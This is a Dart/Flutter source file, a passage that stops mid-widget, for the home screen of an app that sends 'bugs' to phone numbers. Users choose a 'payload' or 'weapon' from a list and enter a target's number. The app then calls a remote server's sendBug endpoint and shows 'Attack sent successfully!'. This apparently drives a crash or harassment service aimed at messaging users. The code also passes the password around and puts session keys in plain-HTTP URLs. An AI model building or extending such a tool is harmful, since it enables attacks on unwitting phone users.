import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'theme_provider.dart';
import 'profile_page.dart';
import 'constants.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final TextEditingController targetController = TextEditingController();
  late final AnimationController _pulseController;
  String selectedBugId = "";
  bool isSending = false;
  String? responseMessage;

  List<Map<String, dynamic>> _privateSenders = [];
  bool _isLoadingSenders = false;
  Timer? _senderPollingTimer;
  static const String baseUrl = "http://lalalucuu.alannxd.my.id:3006";
  static const _pollingInterval = Duration(seconds: 10);

  late VideoPlayerController _videoController;
  ChewieController? _chewieController;
  bool isVideoInitialized = false;

  late VideoPlayerController _loadingVideoController;
  ChewieController? _loadingChewieController;
  bool isLoadingVideoInitialized = false;
  DateTime? _loadingVideoStartTime;
  bool _isDialogShowing = false;

  File? _profileImage;
  String _fullName = "";
  String _bio = "";
  String _memberSince = "";
  int _totalPrivateSenders = 0;
  bool _isProfileRefreshing = false;

  late AnimationController _mainController;
  late Animation<double> _fadeIn;
  late Animation<double> _scaleIn;
  late Animation<Offset> _slideUp;

  int _selectedWeaponIndex = 0;
  final ScrollController _weaponScrollController = ScrollController();

  bool get _canSendBug => _privateSenders.isNotEmpty;

  List<Map<String, dynamic>> get _contactBugs {
    return widget.listBug.where((bug) {
      final type = (bug['type'] ?? bug['bug_type'] ?? bug['category'] ?? '').toString().toLowerCase();
      return type != 'group';
    }).toList();
  }

  // ============================================================
  // REFRESH PROFIL
  // ============================================================
  Future<void> _refreshProfileIfNeeded() async {
    if (_isProfileRefreshing) return;
    _isProfileRefreshing = true;

    final prefs = await SharedPreferences.getInstance();
    final newFullName = prefs.getString('profile_fullname_${widget.username}') ?? widget.username;
    final newBio = prefs.getString('profile_bio_${widget.username}') ?? "User App";
    final newMemberSince = prefs.getString('profile_member_since_${widget.username}') ?? _formatDateToString(DateTime.now());

    bool hasChanged = false;
    if (newFullName != _fullName) {
      _fullName = newFullName;
      hasChanged = true;
    }
    if (newBio != _bio) {
      _bio = newBio;
      hasChanged = true;
    }
    if (newMemberSince != _memberSince) {
      _memberSince = newMemberSince;
      hasChanged = true;
    }

    final imagePath = prefs.getString('profile_image_${widget.username}');
    File? newImage;
    if (imagePath != null && imagePath.isNotEmpty && File(imagePath).existsSync()) {
      newImage = File(imagePath);
    }
    if ((newImage != null && _profileImage == null) ||
        (newImage == null && _profileImage != null) ||
        (newImage != null && _profileImage != null && newImage.path != _profileImage!.path)) {
      _profileImage = newImage;
      hasChanged = true;
    }

    if (hasChanged && mounted) {
      setState(() {});
    }

    _isProfileRefreshing = false;
  }

  @override
  void initState() {
    super.initState();
    _initAnimations();
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    if (_contactBugs.isNotEmpty) {
      selectedBugId = _contactBugs[0]['bug_id'];
      _selectedWeaponIndex = 0;
    }

    _initializeVideoPlayer();
    _initializeLoadingVideoPlayer();
    _fetchSenders();
    _startPolling();
    _loadProfileData();
    _loadProfileImage();
    _loadTotalPrivateSenders();
    _mainController.forward();

    WidgetsBinding.instance.addPostFrameCallback((_) {
      _refreshProfileIfNeeded();
    });
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    _loadProfileData();
    _loadProfileImage();
  }

  void _initAnimations() {
    _mainController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1000),
    );

    _fadeIn = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _mainController, curve: Curves.easeOut),
    );
    _scaleIn = Tween<double>(begin: 0.95, end: 1.0).animate(
      CurvedAnimation(parent: _mainController, curve: Curves.easeOut),
    );
    _slideUp = Tween<Offset>(begin: const Offset(0, 0.05), end: Offset.zero).animate(
      CurvedAnimation(parent: _mainController, curve: Curves.easeOutCubic),
    );
  }

  void _startPolling() {
    _senderPollingTimer = Timer.periodic(_pollingInterval, (timer) {
      if (mounted) {
        _fetchSendersSilent();
      }
    });
  }

  Future<void> _fetchSendersSilent() async {
    try {
      final res = await http
          .get(Uri.parse("$baseUrl/mySender?key=${widget.sessionKey}"))
          .timeout(const Duration(seconds: 8));
      final data = jsonDecode(res.body);
      if (data["valid"] == true && mounted) {
        final newPrivate = List<Map<String, dynamic>>.from(data["privateConnections"] ?? []);
        if (_listChanged(_privateSenders, newPrivate)) {
          setState(() {
            _privateSenders = newPrivate;
            _totalPrivateSenders = newPrivate.length;
          });
        }
      }
    } catch (e) {}
  }

  bool _listChanged(List<Map<String, dynamic>> oldList, List<Map<String, dynamic>> newList) {
    if (oldList.length != newList.length) return true;
    final oldIds = oldList.map((e) => e['id']?.toString() ?? '').toSet();
    final newIds = newList.map((e) => e['id']?.toString() ?? '').toSet();
    return !oldIds.containsAll(newIds) || !newIds.containsAll(oldIds);
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset('assets/videos/banner.mp4');

    _videoController.initialize().then((_) {
      if (mounted) {
        setState(() {
          _videoController.setVolume(0.8);
          _chewieController = ChewieController(
            videoPlayerController: _videoController,
            autoPlay: true,
            looping: true,
            showControls: false,
            autoInitialize: true,
          );
          isVideoInitialized = true;
        });
      }
    }).catchError((error) {
      debugPrint("Video error: $error");
      if (mounted) {
        setState(() {
          isVideoInitialized = false;
        });
      }
    });
  }

  void _initializeLoadingVideoPlayer() {
    _loadingVideoController = VideoPlayerController.asset('assets/videos/loading.mp4');

    _loadingVideoController.initialize().then((_) {
      if (mounted) {
        setState(() {
          _loadingVideoController.setVolume(0.8);
          _loadingChewieController = ChewieController(
            videoPlayerController: _loadingVideoController,
            autoPlay: false,
            looping: false,
            showControls: false,
            autoInitialize: true,
          );
          isLoadingVideoInitialized = true;
        });
      }
    }).catchError((error) {
      debugPrint("Loading video error: $error");
      if (mounted) {
        setState(() {
          isLoadingVideoInitialized = false;
        });
      }
    });
  }

  void _showLoadingVideoDialog() {
    if (!mounted || _isDialogShowing) return;
    _isDialogShowing = true;

    showDialog(
      context: context,
      barrierDismissible: false,
      barrierColor: Colors.black.withOpacity(0.9),
      builder: (BuildContext context) {
        return StatefulBuilder(
          builder: (context, setDialogState) {
            WidgetsBinding.instance.addPostFrameCallback((_) {
              if (_loadingChewieController != null &&
                  _loadingChewieController!.videoPlayerController.value.isInitialized &&
                  !_loadingChewieController!.videoPlayerController.value.isPlaying) {
                _loadingVideoStartTime = DateTime.now();
                _loadingChewieController!.videoPlayerController.play();
              }
            });
            return WillPopScope(
              onWillPop: () async => false,
              child: Dialog(
                backgroundColor: Colors.transparent,
                insetPadding: const EdgeInsets.all(20),
                child: Container(
                  width: MediaQuery.of(context).size.width * 0.7,
                  height: MediaQuery.of(context).size.width * 0.7,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(20),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.5),
                        blurRadius: 20,
                        spreadRadius: 5,
                      ),
                    ],
                  ),
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(20),
                    child: isLoadingVideoInitialized && _loadingChewieController != null
                        ? Chewie(controller: _loadingChewieController!)
                        : Container(
                            color: Colors.black,
                            child: const Center(
                              child: CircularProgressIndicator(
                                color: Colors.white,
                              ),
                            ),
                          ),
                  ),
                ),
              ),
            );
          },
        );
      },
    ).then((_) {
      _isDialogShowing = false;
      _loadingVideoStartTime = null;
    });
  }

  Future<void> _waitForLoadingVideoEnd() async {
    if (_loadingChewieController == null) return;
    final controller = _loadingChewieController!.videoPlayerController;
    if (!controller.value.isInitialized) return;

    final duration = controller.value.duration;
    final startTime = _loadingVideoStartTime;
    if (startTime == null) return;

    final elapsed = DateTime.now().difference(startTime);
    final remaining = duration - elapsed;
    if (remaining > Duration.zero) {
      await Future.delayed(remaining);
    }
  }

  void _hideLoadingVideoDialog() {
    if (mounted && _isDialogShowing) {
      if (_loadingChewieController != null &&
          _loadingChewieController!.videoPlayerController.value.isPlaying) {
        _loadingChewieController!.videoPlayerController.pause();
      }
      Navigator.of(context).pop();
      _isDialogShowing = false;
    }
  }

  Future<void> _loadProfileData() async {
    final prefs = await SharedPreferences.getInstance();
    if (!mounted) return;
    setState(() {
      _fullName = prefs.getString('profile_fullname_${widget.username}') ?? widget.username;
      _bio = prefs.getString('profile_bio_${widget.username}') ?? "User App";
      _memberSince = prefs.getString('profile_member_since_${widget.username}') ?? _formatDateToString(DateTime.now());
    });
  }

  String _formatDateToString(DateTime date) {
    return "${date.day}/${date.month}/${date.year}";
  }

  Future<void> _loadProfileImage() async {
    final prefs = await SharedPreferences.getInstance();
    final imagePath = prefs.getString('profile_image_${widget.username}');
    if (imagePath != null && imagePath.isNotEmpty && File(imagePath).existsSync()) {
      if (!mounted) return;
      setState(() {
        _profileImage = File(imagePath);
      });
    } else {
      if (mounted) setState(() => _profileImage = null);
    }
  }

  Future<void> _loadTotalPrivateSenders() async {
    if (!mounted) return;
    setState(() => _isLoadingSenders = true);
    try {
      final res = await http.get(
        Uri.parse("$baseUrl/mySender?key=${widget.sessionKey}"),
      );
      final data = jsonDecode(res.body);
      if (!mounted) return;
      if (data["valid"] == true) {
        setState(() {
          _privateSenders = List<Map<String, dynamic>>.from(data["privateConnections"] ?? []);
          _totalPrivateSenders = _privateSenders.length;
        });
      }
    } catch (e) {
      debugPrint("Error loading senders: $e");
    } finally {
      if (mounted) setState(() => _isLoadingSenders = false);
    }
  }

  @override
  void dispose() {
    _senderPollingTimer?.cancel();
    _pulseController.dispose();
    _mainController.dispose();
    targetController.dispose();
    _weaponScrollController.dispose();
    try { _videoController.dispose(); } catch (_) {}
    _chewieController?.dispose();
    try { _loadingVideoController.dispose(); } catch (_) {}
    _loadingChewieController?.dispose();
    super.dispose();
  }

  Future<void> _fetchSenders() async {
    setState(() => _isLoadingSenders = true);
    try {
      final res = await http.get(Uri.parse("$baseUrl/mySender?key=${widget.sessionKey}"));
      final data = jsonDecode(res.body);
      if (data["valid"] == true) {
        setState(() {
          _privateSenders = List<Map<String, dynamic>>.from(data["privateConnections"] ?? []);
          _totalPrivateSenders = _privateSenders.length;
        });
      }
    } catch (e) {
      _showAlert("❌ Error", "Gagal memuat data private sender.");
    } finally {
      setState(() => _isLoadingSenders = false);
    }
  }

  String? _formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    final target = _formatPhoneNumber(rawInput);
    if (target == null || key.isEmpty) {
      _showMessageDialog(
        "Invalid Number",
        "Use international format (e.g., +62, +1, +44)",
      );
      return;
    }

    if (!_canSendBug) {
      _showAlert("❌ No Private Sender", "Tambahkan private sender terlebih dahulu!");
      return;
    }

    setState(() {
      isSending = true;
      responseMessage = null;
    });

    _showLoadingVideoDialog();
    await Future.delayed(const Duration(milliseconds: 500));

    try {
      final res = await http.get(
        Uri.parse(
          "$baseUrl/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&senderType=private",
        ),
      ).timeout(const Duration(seconds: 30));

      await _waitForLoadingVideoEnd();
      _hideLoadingVideoDialog();

      final data = jsonDecode(res.body);

      if (!mounted) return;

      if (data["cooldown"] == true) {
        final wait = data["wait"];
        setState(() => responseMessage = wait == null
            ? "⏳ Cooldown: Please wait a moment"
            : "⏳ Cooldown: Wait $wait seconds");
      } else if (data["valid"] == false) {
        setState(() => responseMessage = "❌ Invalid Session: Please login again");
      } else if (data["sended"] == false) {
        setState(() => responseMessage = "⚠️ ${data["message"] ?? "Failed to send bug"}");
      } else {
        setState(() => responseMessage = "✅ Attack sent successfully!");
        targetController.clear();
      }
    } catch (e) {
      await _waitForLoadingVideoEnd();
      _hideLoadingVideoDialog();
      if (mounted) {
        setState(() => responseMessage = "❌ Error: Connection failed");
      }
    } finally {
      if (mounted) {
        setState(() => isSending = false);
      }
    }
  }

  // ============================================================
  // ALERT DIALOG - DEATHTRASH THEME (RED & GOLD)
  // ============================================================
  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: kDeathDarkBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(18),
          side: BorderSide(color: kDeathRed.withOpacity(0.3), width: 1),
        ),
        title: Row(
          children: [
            Icon(Icons.warning_amber_rounded, color: kDeathRed, size: 22),
            const SizedBox(width: 10),
            Text(
              title,
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 15,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
          ],
        ),
        content: Text(
          msg,
          style: TextStyle(
            color: Colors.white.withOpacity(0.6),
            fontSize: 12,
            fontFamily: 'monospace',
            height: 1.5,
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            style: TextButton.styleFrom(
              backgroundColor: kDeathRed.withOpacity(0.08),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(8),
                side: BorderSide(color: kDeathRed.withOpacity(0.15)),
              ),
            ),
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
              child: Text(
                "OK",
                style: TextStyle(
                  color: kDeathRed,
                  fontWeight: FontWeight.w700,
                  fontSize: 12,
                  fontFamily: 'FontX',
                  letterSpacing: 1.5,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ============================================================
  // MESSAGE DIALOG - DEATHTRASH THEME (RED & GOLD)
  // ============================================================
  void _showMessageDialog(String title, String msg) {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          margin: const EdgeInsets.all(20),
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [
                kDeathDarkBg.withOpacity(0.9),
                kDeathCardBg.withOpacity(0.7),
              ],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(
              color: kDeathRed.withOpacity(0.25),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: kDeathRed.withOpacity(0.15),
                blurRadius: 30,
                spreadRadius: 5,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [kDeathRed.withOpacity(0.15), kDeathGold.withOpacity(0.05)],
                  ),
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: kDeathRed.withOpacity(0.2),
                    width: 1.5,
                  ),
                ),
                child: Icon(
                  Icons.warning_rounded,
                  color: kDeathGold,
                  size: 32,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                title,
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 18,
                  fontWeight: FontWeight.w700,
                  fontFamily: 'FontX',
                  letterSpacing: 1.5,
                ),
              ),
              const SizedBox(height: 10),
              Text(
                msg,
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: Colors.white.withOpacity(0.5),
                  fontSize: 13,
                  fontFamily: 'monospace',
                  height: 1.5,
                ),
              ),
              const SizedBox(height: 20),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  width: double.infinity,
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [kDeathRed, kDeathRedDark],
                    ),
                    borderRadius: BorderRadius.circular(12),
                    boxShadow: [
                      BoxShadow(
                        color: kDeathRed.withOpacity(0.3),
                        blurRadius: 16,
                      ),
                    ],
                  ),
                  child: Center(
                    child: Text(
                      "OK",
                      style: TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.w700,
                        fontSize: 13,
                        letterSpacing: 2,
                        fontFamily: 'FontX',
                      ),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── HELPER UNTUK TYPE MSG ───────────────────────────────────────────────
  String _getTypeMsg(Map<String, dynamic> bug) {
    final typeMsg = bug['TypeMsg'] ?? bug['type_msg'] ?? '';
    if (typeMsg.toString().isNotEmpty) {
      return typeMsg.toString();
    }
    final desc = (bug['description'] ?? '').toString().toLowerCase();
    if (desc.contains('rawan kenon')) return 'Rawan Kenon';
    if (desc.contains('aman untuk nokos')) return 'Aman Untuk Nokos';
    if (desc.contains('testing')) return 'Testing';
    return 'Ready';
  }

  Color _getTypeColor(String typeMsg) {
    final lower = typeMsg.toLowerCase();
    if (lower.contains('rawan')) return kDeathRed;
    if (lower.contains('aman')) return kDeathGreen;
    if (lower.contains('testing')) return kDeathGold;
    return kDeathGold;
  }

  Color _getTypeBgColor(String typeMsg) {
    final lower = typeMsg.toLowerCase();
    if (lower.contains('rawan')) return kDeathRed.withOpacity(0.08);
    if (lower.contains('aman')) return kDeathGreen.withOpacity(0.08);
    if (lower.contains('testing')) return kDeathGold.withOpacity(0.08);
    return kDeathGold.withOpacity(0.08);
  }

  // ─── SELECT WEAPON (FIXED) ──────────────────────────────────────────────
  void _selectWeapon(int index) {
    if (_selectedWeaponIndex == index) return;
    if (isSending) return;
    
    setState(() {
      _selectedWeaponIndex = index;
      selectedBugId = _contactBugs[index]['bug_id'];
    });
    
    HapticFeedback.selectionClick();
  }

// ============================================================
// BUILD WEAPON SELECTOR (HORIZONTAL SCROLL) - FIXED
// ============================================================
Widget _buildWeaponSelector(ThemeProvider theme) {
  if (_contactBugs.isEmpty) {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 20),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.02),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.white.withOpacity(0.05)),
      ),
      child: Center(
        child: Column(
          children: [
            Icon(
              Icons.warning_amber_rounded,
              color: theme.textSecondaryColor.withOpacity(0.2),
              size: 32,
            ),
            const SizedBox(height: 8),
            Text(
              "No weapons available",
              style: TextStyle(
                color: theme.textSecondaryColor.withOpacity(0.3),
                fontSize: 12,
                fontWeight: FontWeight.w500,
                fontFamily: 'monospace',
              ),
            ),
          ],
        ),
      ),
    );
  }

  return Column(
    crossAxisAlignment: CrossAxisAlignment.start,
    children: [
      Padding(
        padding: const EdgeInsets.symmetric(horizontal: 4),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Row(
              children: [
                Icon(
                  Icons.center_focus_strong,
                  color: kDeathRed,
                  size: 14,
                ),
                const SizedBox(width: 6),
                Text(
                  'SELECT PAYLOAD',
                  style: TextStyle(
                    color: kDeathRed,
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 1.2,
                    fontFamily: 'FontX',
                  ),
                ),
              ],
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
              decoration: BoxDecoration(
                color: kDeathRed.withOpacity(0.08),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: kDeathRed.withOpacity(0.1)),
              ),
              child: Text(
                '${_selectedWeaponIndex + 1}/${_contactBugs.length}',
                style: TextStyle(
                  color: kDeathRed.withOpacity(0.6),
                  fontSize: 8,
                  fontWeight: FontWeight.w600,
                  fontFamily: 'monospace',
                ),
              ),
            ),
          ],
        ),
      ),
      const SizedBox(height: 8),
      SizedBox(
        height: 200,
        child: ListView.builder(
          controller: _weaponScrollController,
          scrollDirection: Axis.horizontal,
          physics: const BouncingScrollPhysics(),
          padding: const EdgeInsets.symmetric(horizontal: 4),
          itemCount: _contactBugs.length,
          itemBuilder: (context, index) {
            final bug = _contactBugs[index];
            final isActive = index == _selectedWeaponIndex;
            final bugName = bug['bug_name']?.toString() ?? 'Module ${index + 1}';
            final bugDesc = bug['description']?.toString() ?? '';
            final bugId = bug['bug_id']?.toString() ?? '';
            
            final typeMsg = _getTypeMsg(bug);
            final typeColor = _getTypeColor(typeMsg);
            final typeBgColor = _getTypeBgColor(typeMsg);

            return GestureDetector(
              onTap: () => _selectWeapon(index),
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 300),
                width: 165,
                margin: const EdgeInsets.symmetric(horizontal: 6),
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(
                  color: isActive
                      ? kDeathRed.withOpacity(0.04)
                      : kDeathCardBg.withOpacity(0.4),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(
                    color: isActive
                        ? kDeathRed.withOpacity(0.25)
                        : kDeathBorder,
                    width: isActive ? 1.5 : 1,
                  ),
                  boxShadow: isActive
                      ? [
                          BoxShadow(
                            color: kDeathRed.withOpacity(0.05),
                            blurRadius: 20,
                            spreadRadius: 2,
                          ),
                        ]
                      : [],
                ),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: [
                    Stack(
                      alignment: Alignment.center,
                      children: [
                        Container(
                          width: 40,
                          height: 40,
                          decoration: BoxDecoration(
                            color: isActive
                                ? kDeathRed.withOpacity(0.06)
                                : Colors.white.withOpacity(0.02),
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(
                              color: isActive
                                  ? kDeathRed.withOpacity(0.15)
                                  : Colors.white.withOpacity(0.04),
                              width: 1,
                            ),
                          ),
                          child: Icon(
                            Icons.bug_report_rounded,
                            size: 18,
                            color: isActive ? kDeathRed : Colors.white.withOpacity(0.2),
                          ),
                        ),
                        if (isActive)
                          Positioned(
                            right: -2,
                            top: -2,
                            child: Container(
                              padding: const EdgeInsets.all(2),
                              decoration: const BoxDecoration(
                                color: kDeathGreen,
                                shape: BoxShape.circle,
                              ),
                              child: const Icon(
                                Icons.check_rounded,
                                color: Colors.white,
                                size: 10,
                              ),
                            ),
                          ),
                      ],
                    ),
                    const SizedBox(height: 8),
                    
                    // BUG NAME
                    Text(
                      bugName,
                      style: TextStyle(
                        color: isActive ? Colors.white : Colors.white.withOpacity(0.4),
                        fontSize: 11,
                        fontWeight: isActive ? FontWeight.w700 : FontWeight.w500,
                        fontFamily: 'monospace',
                        letterSpacing: 0.2,
                      ),
                      textAlign: TextAlign.center,
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                    
                    const SizedBox(height: 2),
                    
                    // BUG ID
                    Text(
                      '#$bugId',
                      style: TextStyle(
                        color: isActive ? kDeathRed.withOpacity(0.5) : Colors.white.withOpacity(0.1),
                        fontSize: 7,
                        fontFamily: 'monospace',
                      ),
                    ),
                    
                    const SizedBox(height: 4),
                    
                    // TYPE MSG
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(
                        color: typeBgColor,
                        borderRadius: BorderRadius.circular(6),
                        border: Border.all(
                          color: typeColor.withOpacity(0.1),
                          width: 0.5,
                        ),
                      ),
                      child: Text(
                        typeMsg,
                        style: TextStyle(
                          color: typeColor,
                          fontSize: 7,
                          fontWeight: FontWeight.w700,
                          letterSpacing: 0.3,
                          fontFamily: 'monospace',
                        ),
                      ),
                    ),
                    
                    const SizedBox(height: 4),
                    
                    // DESCRIPTION
                    if (bugDesc.isNotEmpty)
                      Text(
                        bugDesc.length > 25 ? '${bugDesc.substring(0, 25)}...' : bugDesc,
                        style: TextStyle(
                          color: isActive 
                              ? Colors.white.withOpacity(0.4) 
                              : Colors.white.withOpacity(0.15),
                          fontSize: 8,
                          fontFamily: 'monospace',
                          fontStyle: FontStyle.italic,
                        ),
                        textAlign: TextAlign.center,
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                    
                    const SizedBox(height: 4),
                    
                    // PROGRESS BAR
                    Container(
                      height: 2,
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.04),
                        borderRadius: BorderRadius.circular(2),
                      ),
                      child: FractionallySizedBox(
                        widthFactor: isActive ? 1.0 : 0.2,
                        child: Container(
                          decoration: BoxDecoration(
                            gradient: isActive
                                ? const LinearGradient(
                                    colors: [kDeathRed, kDeathGold],
                                  )
                                : const LinearGradient(
                                    colors: [Color(0xFF333333), Color(0xFF444444)],
                                  ),
                            borderRadius: BorderRadius.circular(2),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            );
          },
        ),
      ),
      if (_contactBugs.length > 1)
        Padding(
          padding: const EdgeInsets.only(top: 8),
          child: Center(
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: List.generate(
                _contactBugs.length,
                (index) => AnimatedContainer(
                  duration: const Duration(milliseconds: 300),
                  margin: const EdgeInsets.symmetric(horizontal: 3),
                  width: _selectedWeaponIndex == index ? 16 : 4,
                  height: 4,
                  decoration: BoxDecoration(
                    gradient: _selectedWeaponIndex == index
                        ? const LinearGradient(
                            colors: [kDeathRed, kDeathGold],
                          )
                        : null,
                    color: _selectedWeaponIndex == index
                        ? null
                        : Colors.white.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
              ),
            ),
          ),
        ),
    ],
  );
}

  // ============================================================
  // BUILD METHOD
  // ============================================================
  @override
  Widget build(BuildContext context) {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (!_isProfileRefreshing) {
        _refreshProfileIfNeeded();
      }
    });

    final theme = Provider.of<ThemeProvider>(context);

    return Scaffold(
      backgroundColor: kDeathDarkBg,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Color(0xFF0A0612),
              Color(0xFF150A26),
              Color(0xFF1F0F38),
              Color(0xFF120821),
              Color(0xFF06040D),
            ],
            stops: [0.0, 0.25, 0.5, 0.75, 1.0],
          ),
        ),
        child: Stack(
          children: [
            Positioned(
              top: -80,
              left: -60,
              right: -60,
              child: IgnorePointer(
                child: Container(
                  height: 380,
                  decoration: BoxDecoration(
                    gradient: RadialGradient(
                      center: Alignment.topCenter,
                      radius: 1.0,
                      colors: [
                        kDeathRed.withOpacity(0.15),
                        kDeathRedDark.withOpacity(0.08),
                        Colors.transparent,
                      ],
                      stops: const [0.0, 0.5, 1.0],
                    ),
                  ),
                ),
              ),
            ),
            Positioned(
              top: 320,
              right: -120,
              child: IgnorePointer(
                child: Container(
                  width: 320,
                  height: 320,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: RadialGradient(
                      colors: [
                        kDeathGold.withOpacity(0.08),
                        Colors.transparent,
                      ],
                    ),
                  ),
                ),
              ),
            ),
            Positioned(
              bottom: -60,
              left: -100,
              child: IgnorePointer(
                child: Container(
                  width: 280,
                  height: 280,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: RadialGradient(
                      colors: [
                        kDeathRed.withOpacity(0.08),
                        Colors.transparent,
                      ],
                    ),
                  ),
                ),
              ),
            ),

            Container(color: Colors.black.withOpacity(0.35)),

            SafeArea(
              child: FadeTransition(
                opacity: _fadeIn,
                child: ScaleTransition(
                  scale: _scaleIn,
                  child: SlideTransition(
                    position: _slideUp,
                    child: SingleChildScrollView(
                      physics: const BouncingScrollPhysics(),
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        children: [
                          // ─── PROFILE HUD ───
                          GestureDetector(
                            onTap: () async {
                              final result = await Navigator.push(
                                context,
                                MaterialPageRoute(
                                  builder: (context) => ProfilePage(
                                    username: widget.username,
                                    password: widget.password,
                                    role: widget.role,
                                    expiredDate: widget.expiredDate,
                                    sessionKey: widget.sessionKey,
                                  ),
                                ),
                              );
                              if (result == true || result == null) {
                                _refreshProfileIfNeeded();
                              }
                            },
                            child: Container(
                              padding: const EdgeInsets.all(14),
                              decoration: BoxDecoration(
                                color: kDeathCardBg.withOpacity(0.5),
                                borderRadius: BorderRadius.circular(14),
                                border: Border.all(
                                  color: kDeathBorder,
                                  width: 1,
                                ),
                              ),
                              child: Row(
                                children: [
                                  Container(
                                    width: 52,
                                    height: 52,
                                    padding: const EdgeInsets.all(2),
                                    decoration: BoxDecoration(
                                      shape: BoxShape.circle,
                                      border: Border.all(color: kDeathRed, width: 1.5),
                                      boxShadow: [
                                        BoxShadow(
                                          color: kDeathRed.withOpacity(0.08),
                                          blurRadius: 12,
                                        ),
                                      ],
                                    ),
                                    child: ClipOval(
                                      child: _profileImage != null
                                          ? Image.file(_profileImage!, fit: BoxFit.cover)
                                          : Container(
                                              color: kDeathDarkBg,
                                              child: Icon(
                                                Icons.person_rounded,
                                                size: 28,
                                                color: Colors.white.withOpacity(0.2),
                                              ),
                                            ),
                                    ),
                                  ),
                                  const SizedBox(width: 14),
                                  Expanded(
                                    child: Column(
                                      crossAxisAlignment: CrossAxisAlignment.start,
                                      children: [
                                        Text(
                                          _fullName,
                                          style: TextStyle(
                                            color: Colors.white,
                                            fontSize: 14,
                                            fontWeight: FontWeight.w700,
                                            fontFamily: 'monospace',
                                            letterSpacing: 0.3,
                                          ),
                                          overflow: TextOverflow.ellipsis,
                                        ),
                                        const SizedBox(height: 4),
                                        Container(
                                          padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                          decoration: BoxDecoration(
                                            color: kDeathRed.withOpacity(0.08),
                                            borderRadius: BorderRadius.circular(6),
                                            border: Border.all(
                                              color: kDeathRed.withOpacity(0.08),
                                            ),
                                          ),
                                          child: Row(
